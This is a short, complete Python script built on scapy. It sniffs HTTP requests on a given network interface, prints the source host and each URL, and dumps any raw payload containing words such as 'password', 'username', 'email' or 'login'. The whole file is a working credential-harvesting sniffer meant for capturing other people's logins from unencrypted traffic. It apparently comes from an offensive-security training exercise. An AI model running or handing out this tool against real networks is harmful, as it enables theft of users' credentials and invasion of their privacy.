#!/usr/bin/env python

import scapy.all as scapy
import optparse
from scapy.layers import http
from scapy.layers.inet import IP


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option('-i', '--interface', dest="interface", help="Interface to sniff traffic on")
    options = parser.parse_args()[0]
    if not options.interface:
        parser.error("Please specify an interface to sniff traffic, use --help for more info.")
    else:
        return options.interface


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):
    url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
    return url


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        check = ['password', 'username', 'email', 'user_name', 'pass', 'login']
        for item in check:
            if item in load:
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        print("[+] Host: " + packet[IP].src)
        url = get_url(packet)
        print("[+] HTTP URL found.")
        print("[->] " + url)
        load = get_login_info(packet)
        if load:
            print("[+] Possible login found.")
            print('[->] ' + str(load) + '\n')
        else:
            print('\n')


interface = get_arguments()
sniff(interface)
